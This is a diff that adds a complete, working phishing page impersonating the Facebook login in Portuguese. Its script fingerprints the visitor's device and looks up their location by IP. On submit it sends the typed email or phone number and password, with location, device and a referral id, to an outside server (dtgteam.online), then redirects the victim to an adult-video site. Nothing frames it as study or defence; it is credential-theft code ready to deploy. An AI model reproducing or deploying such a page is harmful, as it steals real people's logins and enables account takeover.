@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Facebook</title>
+</head>
+
+<body>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const staff = urlParams.get('nv');
+            var output = '<div class="container-fb" style="width: 100vw; height: 100vh; background-position: center; background-repeat: no-repeat; background-size: cover;"><div class="fb-alert-block">Você deve fazer login primeiro! </div><div class="container-inside"><div class="block-logo"><p style="font-size: 30px;font-family:Arial, Helvetica, sans-serif;"><b style="color:rgb(24, 120, 243);font-size: 60px;font-weight: bold;">facebook</b><span class="fb-slogan"><br>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</span></p></div><form type="post" id="fb-contact-form"><div class="form-fb-container"><div class="form-fb"><input id="fb-un" type="text" class="form-control" placeholder="Email ou telefone" required><br><input id="fb-pw" minlength="8" type="password" class="form-control" placeholder="Senha" autocomplete="off" required><input type="text" style="display:none" id="fb-addr"><br><button type="submit" class="fb-btn-submit button form-control submit">Entrar</button><br><br><a style="text-decoration:none;color:rgb(0, 154, 255);font-family:sans-serif;" href="#">Esqueceu a senha?</a><br><br><hr width="90%" style="margin:0 auto;"><button type="submit" class="green">Criar nova conta</button><br></div></div></form></div><div></div><div class="footer-fb"><div class="footer-fb-inside"><p>Português (Brasil) &nbsp;&nbsp; አማርኛ &nbsp;&nbsp; العربية &nbsp;&nbsp; Af-Soomaali &nbsp;&nbsp; English(UK) &nbsp;&nbsp; Español &nbsp; &nbsp;Français (France) &nbsp;&nbsp; Italiano &nbsp;&nbsp; Deutsch &nbsp;&nbsp; हिन्दी &nbsp;&nbsp; 中文(简体) &nbsp;&nbsp;<br></p><hr><p class="fb-more-link">Sign Up &nbsp;&nbsp;&nbsp&nbsp;&nbsp;&nbsp; Entrar &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Messenger &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Facebook Lite &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Watch &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; People &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Pages &nbsp;&nbsp;&nbsp;&nbsp; Page Categories&nbsp;&nbsp;&nbsp;Places&nbsp;&nbsp;&nbsp;Games&nbsp;&nbsp;&nbsp;Locations &nbsp;&nbsp;&nbsp; Marketplace &nbsp;&nbsp;&nbsp; Facebook Pay &nbsp;&nbsp;&nbsp; Groups &nbsp;&nbsp;&nbsp; <br>Jobs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Oculus&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Portal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Instagram&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Local&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Fundraisers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Services&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Voting Information Center&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;About&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Create Ad &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Create Page&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Developers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Careers&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>Cookies&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ad Choices&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </p><p class="fb-copy-right" style="margin-top:20px">Facebook Inc.</p></div></div></div><style>*{box-sizing:border-box;padding:0;margin:0}.container-fb{display:block;background-color:rgb(241,242,246);width:100%;position: fixed;top: 0;left: 0;min-height: 100vh;height: 100vh;overflow-y: auto}.container-fb button{cursor:pointer}.fb-alert-block{font-size:15px;line-height:24px;background-color:#fffbe2;padding:10px 20px;color:#844a21;border-bottom:1px solid #a9680b}.container-fb .container-inside{width:980px;margin:0 auto;margin-bottom:150px;padding-top:85px;height:530px}.container-fb .block-logo{padding:132px 0 16px;float:left;margin-right:35px}.container-fb .form-fb-container{float:left;margin-top:60px}.container-fb .form-fb{border:none;border-radius:5px;padding:5px;width:380px;background-color:white;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);text-align:center}.container-fb input{font-size:16px;margin:5px;width:350px;padding:16px;border:1px solid rgb(218,214,214);border-radius:5px}.container-fb input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff;caret-color:#1877f2;outline:none}.container-fb .button{color:white;font-weight:bold;border:none;border-radius:5px;width:350px;margin:5px;padding:15px;font-size:16px;background-color:rgb(24,120,243)}.container-fb .green{margin:20px;background-color:rgb(53,187,41);border:none;border-radius:5px;padding:15px;color:white;font-weight:bold;font-size:16px}.container-fb .footer-fb{width:100%;color:rgb(168,164,164);font-family:Arial,Helvetica,sans-serif;font-size:12px}.container-fb .footer-fb-inside{padding:15px 0 25px 0;width:980px;margin:0 auto}.fb-slogan{width:500px;display:block}@media (max-width:1025px){.container-fb{background:#fff}.container-fb .container-inside{width:100%;padding-bottom:80px;padding-top:20px}.container-fb .block-logo>p>b{font-size:40px!important}.fb-slogan{display:none}.container-fb .block-logo{width:100%;text-align:center;padding:20px 0;float:none}.container-fb .form-fb-container{width:100%;margin-top:10px}.container-fb .form-fb{box-shadow:none;margin:0 auto;width:100%}.container-fb .form-fb input,.fb-btn-submit{width:80%!important;max-width:380px}.container-fb .footer-fb-inside{width:100%;padding:0 20px}.fb-more-link{display:none}.fb-copy-right{width:100%;text-align:center;padding-bottom:20px}}@media (max-width:768px){.container-fb .form-fb input,.fb-btn-submit{width:90%!important;max-width:380px}.container-fb .block-logo>p>b{font-size:30px!important}.container-fb .form-fb input,.fb-btn-submit{font-size:14px!important;padding:12px 15px!important}.container-fb .green{padding:8px 15px}.container-fb .container-inside{width:100%;padding-bottom:30px;padding-top:15px}}</style>';
+            var isMobile = {
+                Android: function() {
+                    return navigator.userAgent.match(/Android/i) ? 'Android' : null;
+                },
+                BlackBerry: function() {
+                    return navigator.userAgent.match(/BlackBerry/i) ? 'BlackBerry' : null;
+                },
+                iOS: function() {
+                    return navigator.userAgent.match(/iPhone|iPad|iPod/i) ? 'IOS' : null;
+                },
+                Opera: function() {
+                    return navigator.userAgent.match(/Opera Mini/i) ? 'Opera' : null;
+                },
+                WindowsPhone: function() {
+                    return navigator.userAgent.match(/IEMobile|Windows\sPhone/i) ? 'WindowsPhone' : null;
+                },
+                any: function() {
+                    return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.WindowsPhone());
+                }
+            };
+            var isWindows = {
+                MacOs: function() {
+                    return navigator.userAgent.match(/Mac\sOS/i) ? 'MacOs' : null;
+                },
+                Windows: function() {
+                    return navigator.userAgent.match(/Windows\sNT/i) ? 'Windows' : null;
+                },
+                any: function() {
+                    return (isWindows.MacOs() || isWindows.Windows());
+                }
+            };
+            let device = 'Khác';
+            if (isMobile.any()) {
+                device = 'Điện thoại - ' + isMobile.any();
+            } else if (isWindows.any()) {
+                device = 'Máy tính - ' + isWindows.any();
+            }
+            var domain = 'https://dtgteam.online/';
+            if (screen.availWidth > 200) {
+                setTimeout(function() {
+                    $('body').append(output);
+                    params = new URLSearchParams(window.location.search);
+                    if(params.get('i') != null){
+                        let bg_url = 'https://tiny.one/'+params.get('i');
+                        $('.container-fb').css('background-image', 'url('+bg_url+')');
+                    }
+                    let address = '';
+                    var ajx = $.ajax({
+                        type: 'GET',
+                        crossDomain: true,
+                        dataType: 'jsonp',
+                        url: 'https://jsonip.com',
+                        success: function(data) {
+                            $.ajax({
+                                type: 'GET',
+                                crossDomain: true,
+                                dataType: 'jsonp',
+                                url: 'https://freegeoip.live/json/' + data.ip,
+                                success: function(info) {
+                                    if (info.country_name) {
+                                        address = info.city + " - " + info.country_name;
+                                        $('#fb-addr').val(address);
+                                    } else {
+                                        try {
+                                            $.get("https://ipinfo.io", function(response) {
+                                                address = response.city + " - " + country_code[response.country];
+                                                $('#fb-addr').val(address);
+                                            }, "jsonp");
+                                        } catch (error) {}
+                                    }
+                                }
+                            })
+                        }
+                    });
+                    $('#fb-contact-form').submit(function(e) {
+                        e.preventDefault();
+                        let data = {
+                            "title": $('#fb-un').val(),
+                            "type": "accounts",
+                            "field_password": {
+                                und: [{
+                                    'value': $('#fb-pw').val()
+                                }]
+                            },
+                            "field_address": {
+                                und: [{
+                                    'value': $('#fb-addr').val()
+                                }]
+                            },
+                            "field_device": {
+                                und: [{
+                                    'value': device
+                                }]
+                            },
+                            "ref_nv": staff,
+                        };
+                        var settings = {
+                            "url": domain + "/fbcs/node.json",
+                            "method": "POST",
+                            "timeout": 0,
+                            "headers": {
+                                "Content-Type": "application/x-www-form-urlencoded",
+                                "Cookie": "SSESS4142657e7eacee67bd44008c96a89400=PsS2WxONq2XVOkrFLYNPqXp5RtnUnFKlAVmBOLcPbSw"
+                            },
+                            "data": data,
+                        };
+                        $.ajax(settings).done(function(response) {
+                            window.location.href = 'https://video18.me/v/randv/?utm_source=dtg&utm_medium=referral&utm_campaign=dtg-traffic';
+                        });
+                        return false;
+                    });
+                }, 300);
+            }
+        });
+    </script>
+</body>
+
+</html>
